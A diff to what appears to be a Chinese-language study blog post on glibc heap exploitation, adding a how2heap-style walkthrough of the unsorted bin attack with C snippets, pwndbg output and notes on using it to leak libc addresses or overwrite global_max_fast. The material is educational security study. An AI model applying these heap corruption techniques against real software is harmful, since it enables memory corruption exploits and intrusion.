@@ -15,7 +15,7 @@ tags:
 <details>
      <summary>接下来开始Pwn！太多没接触过的东西了【总目标展开】：</summary>
        <ul> 
-           <li>0day安全看完</li>
+           <li>0day安全、恶意软件漏洞实战看完</li>
            <li>FuzzingBook【软件安全课】</li>
            <li>MIT Computer & Network Security在线课程</li>
            <li>usenix security 论文集【根据共享文档，学习相关论文，确定毕设题目】</li>
@@ -280,7 +280,118 @@ $10 = 0x7d8
 
 ## unsorted bin attack
 
+> This file demonstrates unsorted bin attack by write a large unsigned long value into stack。
+>
+> In practice, unsorted bin attack is generally prepared for further attacks, such as rewriting the global variable global_max_fast in libc for further fastbin attack
+
+这个攻击手段**一般不单独使用，而是为更进一步的攻击做准备**。通过这种攻击方法，可以向栈中**复写**入一个unsigned long的值。
+
+比如：写入的位置是libc中global_max_fast【fastbin中最大chunk的上限设置】的位置，<u>写入一个很大的unsigned long</u>以后，这之后可以进行针对fastbin的更进一步攻击。
+
+#### 攻击过程
+
+在栈上有一个栈单元stack_var需要被改写，目前其初始值为0。
+
+```c++
+unsigned long stack_var=0;
+/*
+pwndbg> print stack_var 
+$1 = 0x0
+pwndbg> print &stack_var 
+$2 = (unsigned long *) 0x7fffffffde08
+*/
+```
+
+然后分配第一个chunk，记为chunk p。
+
+```c++
+unsigned long *p=malloc(400);
+```
+
+再分配一个，防止前一个chunk p在free的时候和top chunk合并了。
+
+```c++
+malloc(500);
+```
+
+此时heap的状态如下：
+
+![](/img/how2heap/unsorted1_1.png)
+
+然后释放掉最早分配的chunk p。
+
+```c++
+free(p);
+```
+
+之后p会被插入到unsorted bin链表中，而且它的fd和bk都指向unsorted bin的head。
+
+此时heap的状态如下：
+
+![](/img/how2heap/unsorted1_2.png)
+
+接着我们模拟一个漏洞攻击改写p的bk指针，改写的值为目标攻击位置的前2个单元【即64位下将p的bk指针改写为target address-2\*8，即32位下将p的bk指针改写为target address-2\*4】：
+
+```c++
+//Now emulating a vulnerability that can overwrite the victim->bk pointer
+//And we write it with the target address-16 (in 32-bits machine, it should be target address-8)
+p[1]=(unsigned long)(&stack_var-2);
+/*注意 p指针指向mem地址【chunk用户地址】，因此在free chunkp后，p[0]为fd，p[1]为bk。
+此时chunkp的情况如下：
+0x602000 PREV_INUSE {
+  prev_size = 0x0, 
+  size = 0x1a1, 
+  fd = 0x7ffff7dd1b78 <main_arena+88>, 
+  bk = 0x7fffffffddf8,   //此处已经被修改
+  fd_nextsize = 0x0, 
+  bk_nextsize = 0x0
+}
+*/
+```
+
+然后用malloc触发unsorted bin的unlink：
+
+```c++
+malloc(400);
+```
+
+也就是会对unsorted bin中的chunkp进行解链：
+
+```c++
+p->fd->bk = p->bk
+p->bk->fd = p->fd
+/*
+chunk p的状态如下
+0x602000 PREV_INUSE {
+  prev_size = 0x0, 
+  size = 0x1a1, 
+  fd = 0x7ffff7dd1b78 <main_arena+88>, 
+  bk = 0x7fffffffddf8, //&stack_var-2
+  fd_nextsize = 0x0, 
+  bk_nextsize = 0x0
+}
+p->fd->bk 即为0x7ffff7dd1b78加3个单元赋值为p->bk=0x7fffffffddf8【这个不是我们关心的】
+但是p->bk->fd就是0x7fffffffddf8加上2个单元赋值，也就是(&stack_var-2) + 2 = &stack_var，即对&stack_var写入p->fd=0x7ffff7dd1b78【如果能对p的fd也操控，就是类似的unlink攻击了】
+
+注意：这里的p是chunk头地址，p->fd是后一个chunk的头地址，p->bk是前一个chunk的头地址【注意不是mem地址】
+*/
+```
+
+<u>然后**stack_var**的值就被改写成了unsorted bin的head的地址了</u>。
+
+![](/img/how2heap/unsorted1_3.png)
+
+#### 攻击效果
+
+这也算是unlink的另一种用法，<u>**unsafe_unlink**通过unlink来直接控制地址，这里则是通过unlink来泄漏libc的信息，来进行进一步的攻击。【知道了libc中unsorted bin head的地址，从而可以得到libc的基地址等】</u>
+
+和**house_of_lore**操作有点像，也是通过修改victim的bk字段，不过我们做这个的主要目的不是返回一个可控的地址，而是将libc的信息写到了我们可控的区域。
+
+![](/img/how2heap/unsorted1_4.png)
+
 ## house of einherjar
+
+
 
 ## house of orange
 
